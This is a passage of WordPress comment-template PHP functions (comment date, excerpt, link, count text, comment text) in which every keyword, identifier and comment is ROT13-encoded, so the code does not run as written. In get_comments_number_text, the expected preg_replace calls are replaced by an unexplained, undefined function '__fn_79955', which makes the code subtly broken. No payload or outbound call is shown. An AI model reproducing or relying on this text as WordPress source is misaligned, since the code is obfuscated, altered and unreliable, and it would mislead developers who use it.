		vs ( $_cbfg ) {
			vs ( $pbzzrag->hfre_vq === $_cbfg->cbfg_nhgube ) {
				$pynffrf[] = 'olcbfgnhgube';
			}
		}
	}

	vs ( rzcgl( $pbzzrag_nyg ) ) {
		$pbzzrag_nyg = 0;
	}
	vs ( rzcgl( $pbzzrag_qrcgu ) ) {
		$pbzzrag_qrcgu = 1;
	}
	vs ( rzcgl( $pbzzrag_guernq_nyg ) ) {
		$pbzzrag_guernq_nyg = 0;
	}

	vs ( $pbzzrag_nyg % 2 ) {
		$pynffrf[] = 'bqq';
		$pynffrf[] = 'nyg';
	} ryfr {
		$pynffrf[] = 'rira';
	}

	++$pbzzrag_nyg;

	// Nyg sbe gbc-yriry pbzzragf.
	vs ( 1 === $pbzzrag_qrcgu ) {
		vs ( $pbzzrag_guernq_nyg % 2 ) {
			$pynffrf[] = 'guernq-bqq';
			$pynffrf[] = 'guernq-nyg';
		} ryfr {
			$pynffrf[] = 'guernq-rira';
		}
		++$pbzzrag_guernq_nyg;
	}

	$pynffrf[] = \"qrcgu-$pbzzrag_qrcgu\";

	vs ( ! rzcgl( $pff_pynff ) ) {
		vs ( ! vf_neenl( $pff_pynff ) ) {
			$pff_pynff = cert_fcyvg( '#\f+#', $pff_pynff );
		}
		$pynffrf = neenl_zretr( $pynffrf, $pff_pynff );
	}

	$pynffrf = neenl_znc( 'rfp_ngge', $pynffrf );

	/**
	 * Svygref gur erghearq PFF pynffrf sbe gur pheerag pbzzrag.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat[]    $pynffrf    Na neenl bs pbzzrag pynffrf.
	 * @cnenz fgevat[]    $pff_pynff  Na neenl bs nqqvgvbany pynffrf nqqrq gb gur yvfg.
	 * @cnenz fgevat      $pbzzrag_vq Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag  $pbzzrag    Gur pbzzrag bowrpg.
	 * @cnenz vag|JC_Cbfg $cbfg       Gur cbfg VQ be JC_Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'pbzzrag_pynff', $pynffrf, $pff_pynff, $pbzzrag->pbzzrag_VQ, $pbzzrag, $cbfg );
}

/**
 * Ergevrirf gur pbzzrag qngr bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz fgevat         $sbezng     Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb trg gur qngr.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur pbzzrag'f qngr.
 */
shapgvba trg_pbzzrag_qngr( $sbezng = '', $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'qngr_sbezng' );

	$pbzzrag_qngr = zlfdy2qngr( $_sbezng, $pbzzrag->pbzzrag_qngr );

	/**
	 * Svygref gur erghearq pbzzrag qngr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat|vag $pbzzrag_qngr Sbeznggrq qngr fgevat be Havk gvzrfgnzc.
	 * @cnenz fgevat     $sbezng       CUC qngr sbezng.
	 * @cnenz JC_Pbzzrag $pbzzrag      Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_qngr', $pbzzrag_qngr, $sbezng, $pbzzrag );
}

/**
 * Qvfcynlf gur pbzzrag qngr bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz fgevat         $sbezng     Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb cevag gur qngr.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_qngr( $sbezng = '', $pbzzrag_vq = 0 ) {
	rpub trg_pbzzrag_qngr( $sbezng, $pbzzrag_vq );
}

/**
 * Ergevrirf gur rkprecg bs gur tvira pbzzrag.
 *
 * Ergheaf n znkvzhz bs 20 jbeqf jvgu na ryyvcfvf nccraqrq vs arprffnel.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb trg gur rkprecg.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur cbffvoyl gehapngrq pbzzrag rkprecg.
 */
shapgvba trg_pbzzrag_rkprecg( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! cbfg_cnffjbeq_erdhverq( $pbzzrag->pbzzrag_cbfg_VQ ) ) {
		$pbzzrag_grkg = fgevc_gntf( fge_ercynpr( neenl( \"\a\", \"\e\" ), ' ', $pbzzrag->pbzzrag_pbagrag ) );
	} ryfr {
		$pbzzrag_grkg = __( 'Cnffjbeq cebgrpgrq' );
	}

	/* genafyngbef: Znkvzhz ahzore bs jbeqf hfrq va n pbzzrag rkprecg. */
	$pbzzrag_rkprecg_yratgu = (vag) _k( '20', 'pbzzrag_rkprecg_yratgu' );

	/**
	 * Svygref gur znkvzhz ahzore bs jbeqf hfrq va gur pbzzrag rkprecg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz vag $pbzzrag_rkprecg_yratgu Gur nzbhag bs jbeqf lbh jnag gb qvfcynl va gur pbzzrag rkprecg.
	 */
	$pbzzrag_rkprecg_yratgu = nccyl_svygref( 'pbzzrag_rkprecg_yratgu', $pbzzrag_rkprecg_yratgu );

	$pbzzrag_rkprecg = jc_gevz_jbeqf( $pbzzrag_grkg, $pbzzrag_rkprecg_yratgu, '&uryyvc;' );

	/**
	 * Svygref gur ergevrirq pbzzrag rkprecg.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_rkprecg Gur pbzzrag rkprecg grkg.
	 * @cnenz fgevat     $pbzzrag_vq      Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag         Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_rkprecg', $pbzzrag_rkprecg, $pbzzrag->pbzzrag_VQ, $pbzzrag );
}

/**
 * Qvfcynlf gur rkprecg bs gur pheerag pbzzrag.
 *
 * @fvapr 1.2.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb cevag gur rkprecg.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_rkprecg( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_rkprecg = trg_pbzzrag_rkprecg( $pbzzrag );

	/**
	 * Svygref gur pbzzrag rkprecg sbe qvfcynl.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $pbzzrag_rkprecg Gur pbzzrag rkprecg grkg.
	 * @cnenz fgevat $pbzzrag_vq      Gur pbzzrag VQ nf n ahzrevp fgevat.
	 */
	rpub nccyl_svygref( 'pbzzrag_rkprecg', $pbzzrag_rkprecg, $pbzzrag->pbzzrag_VQ );
}

/**
 * Ergevrirf gur pbzzrag VQ bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 *
 * @erghea fgevat Gur pbzzrag VQ nf n ahzrevp fgevat.
 */
shapgvba trg_pbzzrag_VQ() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	$pbzzrag = trg_pbzzrag();

	$pbzzrag_vq = ! rzcgl( $pbzzrag->pbzzrag_VQ ) ? $pbzzrag->pbzzrag_VQ : '0';

	/**
	 * Svygref gur erghearq pbzzrag VQ.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_vq Gur pheerag pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag    Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_VQ', $pbzzrag_vq, $pbzzrag );  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.AbgYbjrepnfr
}

/**
 * Qvfcynlf gur pbzzrag VQ bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 */
shapgvba pbzzrag_VQ() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	rpub trg_pbzzrag_VQ();
}

/**
 * Ergevrirf gur yvax gb n tvira pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag` gb nyfb npprcg n JC_Pbzzrag bowrpg. Nqqrq `$pcntr` nethzrag.
 *
 * @frr trg_cntr_bs_pbzzrag()
 *
 * @tybony JC_Erjevgr $jc_erjevgr      JbeqCerff erjevgr pbzcbarag.
 * @tybony obby       $va_pbzzrag_ybbc
 *
 * @cnenz JC_Pbzzrag|vag|ahyy $pbzzrag Bcgvbany. Pbzzrag gb ergevrir. Qrsnhyg pheerag pbzzrag.
 * @cnenz neenl               $netf {
 *     Na neenl bs bcgvbany nethzragf gb bireevqr gur qrsnhygf.
 *
 *     @glcr fgevat     $glcr      Cnffrq gb trg_cntr_bs_pbzzrag().
 *     @glcr vag        $cntr      Pheerag cntr bs pbzzragf, sbe pnyphyngvat pbzzrag cntvangvba.
 *     @glcr vag        $cre_cntr  Cre-cntr inyhr sbe pbzzrag cntvangvba.
 *     @glcr vag        $znk_qrcgu Cnffrq gb trg_cntr_bs_pbzzrag().
 *     @glcr vag|fgevat $pcntr     Inyhr gb hfr sbe gur pbzzrag'f \"pbzzrag-cntr\" be \"pcntr\" inyhr.
 *                                 Vs cebivqrq, guvf inyhr bireevqrf nal inyhr pnyphyngrq sebz `$cntr`
 *                                 naq `$cre_cntr`.
 * }
 * @erghea fgevat Gur creznyvax gb gur tvira pbzzrag.
 */
shapgvba trg_pbzzrag_yvax( $pbzzrag = ahyy, $netf = neenl() ) {
	tybony $jc_erjevgr, $va_pbzzrag_ybbc;

	$pbzzrag = trg_pbzzrag( $pbzzrag );

	// Onpx-pbzcng.
	vs ( ! vf_neenl( $netf ) ) {
		$netf = neenl( 'cntr' => $netf );
	}

	$qrsnhygf = neenl(
		'glcr'      => 'nyy',
		'cntr'      => '',
		'cre_cntr'  => '',
		'znk_qrcgu' => '',
		'pcntr'     => ahyy,
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$pbzzrag_yvax = trg_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ );

	// Gur 'pcntr' cnenz gnxrf cerprqrapr.
	vs ( ! vf_ahyy( $netf['pcntr'] ) ) {
		$pcntr = $netf['pcntr'];

		// Ab 'pcntr' vf cebivqrq, fb jr pnyphyngr bar.
	} ryfr {
		vs ( '' === $netf['cre_cntr'] && trg_bcgvba( 'cntr_pbzzragf' ) ) {
			$netf['cre_cntr'] = trg_bcgvba( 'pbzzragf_cre_cntr' );
		}

		vs ( rzcgl( $netf['cre_cntr'] ) ) {
			$netf['cre_cntr'] = 0;
			$netf['cntr']     = 0;
		}

		$pcntr = $netf['cntr'];

		vs ( '' === $pcntr ) {
			vs ( ! rzcgl( $va_pbzzrag_ybbc ) ) {
				$pcntr = (vag) trg_dhrel_ine( 'pcntr' );
			} ryfr {
				// Erdhverf n qngnonfr uvg, fb jr bayl qb vg jura jr pna'g svther bhg sebz pbagrkg.
				$pcntr = trg_cntr_bs_pbzzrag( $pbzzrag->pbzzrag_VQ, $netf );
			}
		}

		/*
		 * Vs gur qrsnhyg cntr qvfcynlf gur byqrfg pbzzragf, gur creznyvaxf sbe pbzzragf ba gur qrsnhyg cntr
		 * qb abg arrq n 'pcntr' dhrel ine.
		 */
		vs ( 'byqrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) && 1 === $pcntr ) {
			$pcntr = '';
		}
	}

	vs ( $pcntr && trg_bcgvba( 'cntr_pbzzragf' ) ) {
		vs ( $jc_erjevgr->hfvat_creznyvaxf() ) {
			vs ( $pcntr ) {
				$pbzzrag_yvax = genvyvatfynfuvg( $pbzzrag_yvax ) . $jc_erjevgr->pbzzragf_cntvangvba_onfr . '-' . $pcntr;
			}

			$pbzzrag_yvax = hfre_genvyvatfynfuvg( $pbzzrag_yvax, 'pbzzrag' );
		} ryfrvs ( $pcntr ) {
			$pbzzrag_yvax = nqq_dhrel_net( 'pcntr', $pcntr, $pbzzrag_yvax );
		}
	}

	vs ( $jc_erjevgr->hfvat_creznyvaxf() ) {
		$pbzzrag_yvax = hfre_genvyvatfynfuvg( $pbzzrag_yvax, 'pbzzrag' );
	}

	$pbzzrag_yvax = $pbzzrag_yvax . '#pbzzrag-' . $pbzzrag->pbzzrag_VQ;

	/**
	 * Svygref gur erghearq fvatyr pbzzrag creznyvax.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.4.0 Nqqrq gur `$pcntr` cnenzrgre.
	 *
	 * @frr trg_cntr_bs_pbzzrag()
	 *
	 * @cnenz fgevat     $pbzzrag_yvax Gur pbzzrag creznyvax jvgu '#pbzzrag-$vq' nccraqrq.
	 * @cnenz JC_Pbzzrag $pbzzrag      Gur pheerag pbzzrag bowrpg.
	 * @cnenz neenl      $netf         Na neenl bs nethzragf gb bireevqr gur qrsnhygf.
	 * @cnenz vag        $pcntr        Gur pnyphyngrq 'pcntr' inyhr.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_yvax', $pbzzrag_yvax, $pbzzrag, $netf, $pcntr );
}

/**
 * Ergevrirf gur yvax gb gur pheerag cbfg pbzzragf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat Gur yvax gb gur pbzzragf.
 */
shapgvba trg_pbzzragf_yvax( $cbfg = 0 ) {
	$unfu          = trg_pbzzragf_ahzore( $cbfg ) ? '#pbzzragf' : '#erfcbaq';
	$pbzzragf_yvax = trg_creznyvax( $cbfg ) . $unfu;

	/**
	 * Svygref gur erghearq cbfg pbzzragf creznyvax.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat      $pbzzragf_yvax Cbfg pbzzragf creznyvax jvgu '#pbzzragf' nccraqrq.
	 * @cnenz vag|JC_Cbfg $cbfg          Cbfg VQ be JC_Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzragf_yvax', $pbzzragf_yvax, $cbfg );
}

/**
 * Qvfcynlf gur yvax gb gur pheerag cbfg pbzzragf.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $qrcerpngrq   Abg Hfrq.
 * @cnenz fgevat $qrcerpngrq_2 Abg Hfrq.
 */
shapgvba pbzzragf_yvax( $qrcerpngrq = '', $qrcerpngrq_2 = '' ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '0.72' );
	}
	vs ( ! rzcgl( $qrcerpngrq_2 ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '1.3.0' );
	}
	rpub rfp_hey( trg_pbzzragf_yvax() );
}

/**
 * Ergevrirf gur nzbhag bs pbzzragf n cbfg unf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @erghea fgevat|vag Vs gur cbfg rkvfgf, n ahzrevp fgevat ercerfragvat gur ahzore bs pbzzragf
 *                    gur cbfg unf, bgurejvfr 0.
 */
shapgvba trg_pbzzragf_ahzore( $cbfg = 0 ) {
	$cbfg = trg_cbfg( $cbfg );

	$pbzzragf_ahzore = $cbfg ? $cbfg->pbzzrag_pbhag : 0;
	$cbfg_vq         = $cbfg ? $cbfg->VQ : 0;

	/**
	 * Svygref gur erghearq pbzzrag pbhag sbe n cbfg.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat|vag $pbzzragf_ahzore N fgevat ercerfragvat gur ahzore bs pbzzragf n cbfg unf, bgurejvfr 0.
	 * @cnenz vag        $cbfg_vq Cbfg VQ.
	 */
	erghea nccyl_svygref( 'trg_pbzzragf_ahzore', $pbzzragf_ahzore, $cbfg_vq );
}

/**
 * Qvfcynlf gur ynathntr fgevat sbe gur ahzore bs pbzzragf gur pheerag cbfg unf.
 *
 * @fvapr 0.71
 * @fvapr 5.4.0 Gur `$qrcerpngrq` cnenzrgre jnf punatrq gb `$cbfg`.
 *
 * @cnenz fgevat|snyfr $mreb Bcgvbany. Grkg sbe ab pbzzragf. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $bar  Bcgvbany. Grkg sbe bar pbzzrag. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $zber Bcgvbany. Grkg sbe zber guna bar pbzzrag. Qrsnhyg snyfr.
 * @cnenz vag|JC_Cbfg  $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 */
shapgvba pbzzragf_ahzore( $mreb = snyfr, $bar = snyfr, $zber = snyfr, $cbfg = 0 ) {
	rpub trg_pbzzragf_ahzore_grkg( $mreb, $bar, $zber, $cbfg );
}

/**
 * Qvfcynlf gur ynathntr fgevat sbe gur ahzore bs pbzzragf gur pheerag cbfg unf.
 *
 * @fvapr 4.0.0
 * @fvapr 5.4.0 Nqqrq gur `$cbfg` cnenzrgre gb nyybj hfvat gur shapgvba bhgfvqr bs gur ybbc.
 *
 * @cnenz fgevat|snyfr $mreb Bcgvbany. Grkg sbe ab pbzzragf. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $bar  Bcgvbany. Grkg sbe bar pbzzrag. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $zber Bcgvbany. Grkg sbe zber guna bar pbzzrag. Qrsnhyg snyfr.
 * @cnenz vag|JC_Cbfg  $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @erghea fgevat Ynathntr fgevat sbe gur ahzore bs pbzzragf n cbfg unf.
 */
shapgvba trg_pbzzragf_ahzore_grkg( $mreb = snyfr, $bar = snyfr, $zber = snyfr, $cbfg = 0 ) {
	$pbzzragf_ahzore = (vag) trg_pbzzragf_ahzore( $cbfg );

	vs ( $pbzzragf_ahzore > 1 ) {
		vs ( snyfr === $zber ) {
			$pbzzragf_ahzore_grkg = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f Pbzzrag', '%f Pbzzragf', $pbzzragf_ahzore ),
				ahzore_sbezng_v18a( $pbzzragf_ahzore )
			);
		} ryfr {
			// % Pbzzragf
			/*
			 * genafyngbef: Vs pbzzrag ahzore va lbhe ynathntr erdhverf qrpyrafvba,
			 * genafyngr guvf gb 'ba'. Qb abg genafyngr vagb lbhe bja ynathntr.
			 */
			vs ( 'ba' === _k( 'bss', 'Pbzzrag ahzore qrpyrafvba: ba be bss' ) ) {
				$grkg = __sa_79955( '#<fcna pynff=\"fperra-ernqre-grkg\">.+?</fcna>#', '', $zber );
				$grkg = __sa_79955( '/&.+?;/', '', $grkg ); // Erzbir UGZY ragvgvrf.
				$grkg = gevz( fgevc_gntf( $grkg ), '% ' );

				// Ercynpr '% Pbzzragf' jvgu n cebcre cyheny sbez.
				vs ( $grkg && ! cert_zngpu( '/[0-9]+/', $grkg ) && fge_pbagnvaf( $zber, '%' ) ) {
					/* genafyngbef: %f: Ahzore bs pbzzragf. */
					$arj_grkg = _a( '%f Pbzzrag', '%f Pbzzragf', $pbzzragf_ahzore );
					$arj_grkg = gevz( fcevags( $arj_grkg, '' ) );

					$zber = fge_ercynpr( $grkg, $arj_grkg, $zber );
					vs ( ! fge_pbagnvaf( $zber, '%' ) ) {
						$zber = '% ' . $zber;
					}
				}
			}

			$pbzzragf_ahzore_grkg = fge_ercynpr( '%', ahzore_sbezng_v18a( $pbzzragf_ahzore ), $zber );
		}
	} ryfrvs ( 0 === $pbzzragf_ahzore ) {
		$pbzzragf_ahzore_grkg = ( snyfr === $mreb ) ? __( 'Ab Pbzzragf' ) : $mreb;
	} ryfr { // Zhfg or bar.
		$pbzzragf_ahzore_grkg = ( snyfr === $bar ) ? __( '1 Pbzzrag' ) : $bar;
	}

	/**
	 * Svygref gur pbzzragf pbhag sbe qvfcynl.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr _a()
	 *
	 * @cnenz fgevat $pbzzragf_ahzore_grkg N genafyngnoyr fgevat sbeznggrq onfrq ba jurgure gur pbhag
	 *                                     vf rdhny gb 0, 1, be 1+.
	 * @cnenz vag    $pbzzragf_ahzore      Gur ahzore bs cbfg pbzzragf.
	 */
	erghea nccyl_svygref( 'pbzzragf_ahzore', $pbzzragf_ahzore_grkg, $pbzzragf_ahzore );
}

/**
 * Ergevrirf gur grkg bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 * @fvapr 5.4.0 Nqqrq 'Va ercyl gb %f.' cersvk gb puvyq pbzzragf va pbzzragf srrq.
 *
 * @frr Jnyxre_Pbzzrag::pbzzrag()
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb trg gur grkg.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @cnenz neenl          $netf       Bcgvbany. Na neenl bs nethzragf. Qrsnhyg rzcgl neenl.
 * @erghea fgevat Gur pbzzrag pbagrag.
 */
shapgvba trg_pbzzrag_grkg( $pbzzrag_vq = 0, $netf = neenl() ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_grkg = $pbzzrag->pbzzrag_pbagrag;

	vs ( vf_pbzzrag_srrq() && $pbzzrag->pbzzrag_cnerag ) {
		$cnerag = trg_pbzzrag( $pbzzrag->pbzzrag_cnerag );
		vs ( $cnerag ) {
			$cnerag_yvax = rfp_hey( trg_pbzzrag_yvax( $cnerag ) );
			$anzr        = trg_pbzzrag_nhgube( $cnerag );

			$pbzzrag_grkg = fcevags(
				/* genafyngbef: %f: Pbzzrag yvax. */
				rag2ape( __( 'Va ercyl gb %f.' ) ),
				'<n uers=\"' . $cnerag_yvax . '\">' . $anzr . '</n>'
			) . \"\a\a\" . $pbzzrag_grkg;
		}
	}

	/**
	 * Svygref gur grkg bs n pbzzrag.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr Jnyxre_Pbzzrag::pbzzrag()
	 *
	 * @cnenz fgevat     $pbzzrag_grkg Grkg bs gur pbzzrag.
	 * @cnenz JC_Pbzzrag $pbzzrag      Gur pbzzrag bowrpg.
	 * @cnenz neenl      $netf         Na neenl bs nethzragf.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_grkg', $pbzzrag_grkg, $pbzzrag, $netf );
}

/**
 * Qvfcynlf gur grkg bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @frr Jnyxre_Pbzzrag::pbzzrag()
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb cevag gur grkg.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @cnenz neenl          $netf       Bcgvbany. Na neenl bs nethzragf. Qrsnhyg rzcgl neenl.
 */
shapgvba pbzzrag_grkg( $pbzzrag_vq = 0, $netf = neenl() ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_grkg = trg_pbzzrag_grkg( $pbzzrag, $netf );

	/**
	 * Svygref gur grkg bs n pbzzrag gb or qvfcynlrq.
	 *
	 * @fvapr 1.2.0
	 *
	 * @frr Jnyxre_Pbzzrag::pbzzrag()
	 *
	 * @cnenz fgevat          $pbzzrag_grkg Grkg bs gur pbzzrag.
	 * @cnenz JC_Pbzzrag|ahyy $pbzzrag      Gur pbzzrag bowrpg. Ahyy vs abg sbhaq.
	 * @cnenz neenl           $netf         Na neenl bs nethzragf.
	 */
	rpub nccyl_svygref( 'pbzzrag_grkg', $pbzzrag_grkg, $pbzzrag, $netf );
}

/**
 * Ergevrirf gur pbzzrag gvzr bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 6.2.0 Nqqrq gur `$pbzzrag_vq` cnenzrgre.
 *
 * @cnenz fgevat         $sbezng     Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 * @cnenz obby           $tzg        Bcgvbany. Jurgure gb hfr gur TZG qngr. Qrsnhyg snyfr.
 * @cnenz obby           $genafyngr  Bcgvbany. Jurgure gb genafyngr gur gvzr (sbe hfr va srrqf).
 *                                   Qrsnhyg gehr.
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb trg gur gvzr.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur sbeznggrq gvzr.
 */
shapgvba trg_pbzzrag_gvzr( $sbezng = '', $tzg = snyfr, $genafyngr = gehr, $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ahyy === $pbzzrag ) {
		erghea '';
	}

	$pbzzrag_qngr = $tzg ? $pbzzrag->pbzzrag_qngr_tzg : $pbzzrag->pbzzrag_qngr;

	$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'gvzr_sbezng' );

	$pbzzrag_gvzr = zlfdy2qngr( $_sbezng, $pbzzrag_qngr, $genafyngr );

	/**
	 * Svygref gur erghearq pbzzrag gvzr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat|vag $pbzzrag_gvzr Gur pbzzrag gvzr, sbeznggrq nf n qngr fgevat be Havk gvzrfgnzc.
	 * @cnenz fgevat     $sbezng       CUC qngr sbezng.
	 * @cnenz obby       $tzg          Jurgure gur TZG qngr vf va hfr.
	 * @cnenz obby       $genafyngr    Jurgure gur gvzr vf genafyngrq.
	 * @cnenz JC_Pbzzrag $pbzzrag      Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_gvzr', $pbzzrag_gvzr, $sbezng, $tzg, $genafyngr, $pbzzrag );
}

/**
 * Qvfcynlf gur pbzzrag gvzr bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 6.2.0 Nqqrq gur `$pbzzrag_vq` cnenzrgre.
 *
 * @cnenz fgevat         $sbezng     Bcgvbany. CUC gvzr sbezng. Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb cevag gur gvzr.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_gvzr( $sbezng = '', $pbzzrag_vq = 0 ) {
	rpub trg_pbzzrag_gvzr( $sbezng, snyfr, gehr, $pbzzrag_vq );
}

/**
 * Ergevrirf gur pbzzrag glcr bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be VQ bs gur pbzzrag sbe juvpu gb trg gur glcr.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur pbzzrag glcr.
 */
shapgvba trg_pbzzrag_glcr( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( '' === $pbzzrag->pbzzrag_glcr ) {
		$pbzzrag->pbzzrag_glcr = 'pbzzrag';
	}

	/**
	 * Svygref gur erghearq pbzzrag glcr.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_glcr Gur glcr bs pbzzrag, fhpu nf 'pbzzrag', 'cvatonpx', be 'genpxonpx'.
